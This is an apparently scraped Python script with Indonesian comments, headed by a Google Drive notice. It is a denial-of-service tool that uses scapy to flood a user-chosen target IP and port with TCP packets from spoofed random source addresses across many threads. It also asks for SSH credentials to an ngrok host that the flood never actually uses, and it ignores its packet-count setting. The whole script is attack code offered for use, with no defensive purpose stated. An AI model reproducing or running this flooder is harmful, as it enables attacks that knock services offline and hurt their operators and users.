Pembaruan pada pintasan keyboard … Pada Kamis, 01 Agustus 2024, pintasan keyboard Drive akan diperbarui untuk memberi Anda navigasi huruf pertamaPelajari lebih lanjut
import random
import ipaddress
from scapy.all import IP, TCP, send
from concurrent.futures import ThreadPoolExecutor
import paramiko  # Tambahkan modul Paramiko untuk SSH

# Fungsi untuk melakukan SSH ke host target
def ssh_connect(ip, port, username, password):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(ip, port, username=username, password=password)
        print("[+] SSH connection established to {0}:{1}".format(ip, port))
        return ssh_client
    except Exception as e:
        print("[+] SSH connection failed:", str(e))
        return None

# Fungsi untuk memeriksa koneksi SSH yang valid
def validate_ssh_connection(ssh_client):
    if ssh_client:
        return True
    else:
        return False

# Tujuan IP yang ingin diserang
target_ip = None

def generate_random_ip():
    return str(ipaddress.IPv4Address(random.randint(0, 2**32 - 1)))

def start(packet_count, port, ssh_client):
    global target_ip

    if validate_ssh_connection(ssh_client):
        while True:
            try:
                # IP source akan dihasilkan acak
                source_ip = generate_random_ip()
                
                # Buat paket TCP dengan scapy
                packet = IP(src=source_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=port)

                # Kirim paket
                send(packet, verbose=0)

                print("[+] Attacking {0}:{1}".format(target_ip, port))
            except Exception as e:
                print('[+] Server Down:', str(e))
    else:
        print("[+] SSH connection is not valid. Exiting...")

def stop(ssh_client):
    if ssh_client:
        ssh_client.close()
    input("[+] Press Enter to stop the attack...")
    exit()

def main():
    global target_ip
    ssh_ip = str(input('[+] SSH To NGROK Domain: '))
    ssh_port = int(input('[+] SSH NGROK Port: '))
    ssh_username = str(input('[+] SSH NGROK Username: '))
    ssh_password = str(input('[+] SSH NGROK Password: '))

    # Melakukan SSH ke host target
    ssh_client = ssh_connect(ssh_ip, ssh_port, ssh_username, ssh_password)
    
    if validate_ssh_connection(ssh_client):
        target_ip = str(input('[+] Target IP: '))
        port = int(input('[+] Port: '))
        packet_count = int(input('[+] Packets: '))
        thread_count = int(input('[+] Threads: '))

        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            for _ in range(thread_count):
                executor.submit(start, packet_count, port, ssh_client)

        stop(ssh_client)
    else:
        print("[+] Exiting...")

if __name__ == "__main__":
    main()
